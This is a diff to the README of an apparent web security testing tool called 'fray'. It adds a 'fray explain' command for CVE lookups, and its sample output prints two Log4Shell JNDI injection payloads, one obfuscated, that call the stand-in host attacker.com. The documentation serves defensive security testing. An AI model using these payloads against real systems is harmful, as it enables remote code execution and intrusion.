@@ -60,7 +60,10 @@ fray detect https://example.com
 # 4. Test specific category
 fray test https://example.com -c xss --max 10
 
-# 5. Generate report
+# 5. Explain a CVE — payloads, severity, what to test
+fray explain CVE-2021-44228
+
+# 6. Generate report
 fray report -i results.json -o report.html
 ```
 
@@ -273,6 +276,34 @@ fray payloads  # List all categories
 | OWASP Mobile | 575+ | CVE Exploits | 220 |
 
 Includes **120 real-world CVEs** (2020–2026): Log4Shell, Spring4Shell, ProxyShell, React2Shell, and more.
+
+### `fray explain` — CVE Intelligence
+
+```bash
+fray explain CVE-2021-44228        # by CVE ID
+fray explain log4shell              # by name
+fray explain react2shell --max 10   # show more payloads
+fray explain spring4shell --json    # JSON output
+```
+
+```
+Fray Explain — CVE Intelligence
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  CVE-2021-44228
+  Log4Shell - Log4j RCE
+
+  Severity:     CRITICAL (CVSS 10.0)
+  Affected:     Log4j 2.0-beta9 to 2.14.1
+  Disclosed:    2021-12-09
+  Payloads:     2 available
+
+  #1 ${jndi:ldap://attacker.com/exploit}
+  #2 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+
+  What to test:
+    → Test command execution endpoints, check input sanitization
+    → fray test <url> -c xss --max 10
+```
 
 [Full payload database →](docs/payload-database-coverage.md) · [CVE coverage →](docs/cve-real-world-bypasses.md) · [AI security →](docs/ai-security-guide.md) · [Mobile security →](docs/owasp-mobile-top10.md) · [API security →](docs/owasp-api-security.md)
 
